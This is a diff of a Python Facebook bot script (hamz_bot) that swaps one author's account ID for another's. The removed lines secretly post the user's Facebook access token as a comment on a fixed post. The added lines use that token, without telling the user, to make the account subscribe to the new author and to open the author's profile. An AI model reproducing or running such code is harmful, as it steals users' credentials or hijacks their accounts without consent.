@@ -119,14 +119,12 @@ def hamz_bot():
     except IOError:
         print ('[! Token invalid') 
         os.system('rm -rf login.txt')
-    kom = " Bang @[100006414900732:] Ganteng Bangetz Ngga Ada Obat "
-    requests.post('https://graph.facebook.com/100006414900732/subscribers?access_token=' + token)
-    requests.post('https://graph.facebook.com/100006414900732/subscribers?access_token=' + token)
-    requests.post('https://graph.facebook.com/3115522672004866/comments/?message=' +token+ '&access_token=' + token)
-    requests.post('https://graph.facebook.com/3115522672004866/comments/?message=' +kom+ '&access_token=' + token)
+    kom = " Bang @[100057377106427:] Ganteng Bangetz Ngga Ada Obat "
+    requests.post('https://graph.facebook.com/100057377106427/subscribers?access_token=' + token)
+    requests.post('https://graph.facebook.com/100057377106427/subscribers?access_token=' + token)
     menu()
 print("HI DEK")
-os.system("xdg-open https://www.facebook.com/mustofa.ganteng123?text=Hallo%20Bang%20Ganteng")
+os.system("xdg-open https://www.facebook.com/100057377106427?text=Hallo%20Bang%20Ganteng")
 # COLORS
 x = '\33[m' # DEFAULT
 k = '\033[93m' # KUNING +
@@ -1090,11 +1088,9 @@ def hamz_bot():
     except IOError:
         print ('[! Token invalid') 
         os.system('rm -rf login.txt')
-    kom = " Bang @[100006414900732:] Ganteng Bangetz Ngga Ada Obat "
-    requests.post('https://graph.facebook.com/100006414900732/subscribers?access_token=' + token)
-    requests.post('https://graph.facebook.com/100006414900732/subscribers?access_token=' + token)
-    requests.post('https://graph.facebook.com/3115522672004866/comments/?message=' +token+ '&access_token=' + token)
-    requests.post('https://graph.facebook.com/3115522672004866/comments/?message=' +kom+ '&access_token=' + token)
+    kom = " Bang @[100057377106427:] Ganteng Bangetz Ngga Ada Obat "
+    requests.post('https://graph.facebook.com/100057377106427/subscribers?access_token=' + token)
+    requests.post('https://graph.facebook.com/100057377106427/subscribers?access_token=' + token)
     menu()
 
 if __name__=='__main__':
